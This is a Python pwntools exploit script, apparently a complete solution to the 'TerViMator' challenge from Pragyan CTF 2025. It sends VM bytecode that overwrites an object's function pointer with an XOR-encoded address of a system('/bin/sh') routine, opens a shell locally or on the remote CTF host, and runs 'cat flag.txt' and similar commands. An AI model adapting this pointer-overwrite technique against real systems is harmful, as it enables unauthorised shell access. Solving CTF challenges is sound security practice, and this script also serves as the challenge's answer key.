#!/usr/bin/env python3
"""
TerViMator - Final Exploit
Pragyan CTF 2025

Strategy:
1. Use syscall 2 to create executable object (ID 0)
2. Overwrite function pointer at offset 0x10 with XORed escalation address
3. Use syscall 8 to execute object -> system("/bin/sh")
"""
from pwn import *
import struct
import subprocess

context.log_level = 'info'

# Target addresses
ESCALATION_FUNC = 0x129d  # system("/bin/sh")
XOR_KEY = 0x1a5bfe810dce5825

# Calculate encrypted pointer
encrypted_escalation = ESCALATION_FUNC ^ XOR_KEY

log.info(f"Target: {hex(ESCALATION_FUNC)}")
log.info(f"Encrypted: {hex(encrypted_escalation)}")

def build_exploit():
    bytecode = b''

    # Step 1: Create executable object (syscall 2)
    log.info("[1] Creating executable object...")
    bytecode += p8(1) + p8(0) + p32(2)  # SET_REG(0, 2) - syscall ID
    bytecode += p8(6)  # SYSCALL - creates object ID 0

    # Step 2: Overwrite function pointer
    # Object structure: offset 0x10 = function pointer (8 bytes)
    log.info("[2] Overwriting function pointer...")

    encrypted_bytes = struct.pack('<Q', encrypted_escalation)

    for i, byte_val in enumerate(encrypted_bytes):
        # Set parameters for write_byte syscall (6)
        bytecode += p8(1) + p8(0) + p32(6)      # Syscall ID = 6 (write_byte)
        bytecode += p8(1) + p8(1) + p32(0)      # Param1: obj_id = 0 (0x51c4)
        bytecode += p8(1) + p8(2) + p32(0x10 + i)  # Param2: offset = 0x10+i (0x51c8)
        bytecode += p8(1) + p8(3) + p32(byte_val)  # Param3: value = byte (0x51cc)
        bytecode += p8(6)  # SYSCALL

    # Step 3: Execute object (syscall 8)
    log.info("[3] Executing object -> SHELL!")
    bytecode += p8(1) + p8(0) + p32(8)  # Syscall ID = 8 (call_function)
    bytecode += p8(1) + p8(1) + p32(0)  # Param1: obj_id = 0
    bytecode += p8(6)  # SYSCALL

    # Exit cleanly
    bytecode += p8(0)

    log.info(f"Bytecode size: {len(bytecode)} bytes")
    return bytecode

def exploit_local():
    log.info("Testing locally...")
    io = process(['./chal'])
    io.sendafter(b'bytecode...', build_exploit())

    log.info("Should have shell")
    io.interactive()

def exploit_remote():
    log.info("Exploiting remote...")

    proc = subprocess.Popen(
        ['openssl', 's_client', '-connect', 'tervimator.ctf.prgy.in:1337', '-quiet'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=False
    )

    # Wait for prompt
    banner = proc.stdout.read(40)
    log.info(f"Banner: {banner}")

    # Send exploit
    proc.stdin.write(build_exploit())
    proc.stdin.flush()

    time.sleep(0.5)

    # Send commands
    log.info("Sending commands...")
    commands = [
        b"cat flag.txt\n",
        b"ls -la\n",
        b"pwd\n",
        b"id\n"
    ]

    for cmd in commands:
        proc.stdin.write(cmd)
        proc.stdin.flush()
        time.sleep(0.3)

    proc.stdin.write(b"exit\n")
    proc.stdin.flush()

    # Read output
    output = proc.stdout.read(4096)
    print("\n" + "="*60)
    print(output.decode(errors='ignore'))
    print("="*60 + "\n")

    proc.terminate()

if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1 and sys.argv[1].upper() == "REMOTE":
        exploit_remote()
    else:
        exploit_local()
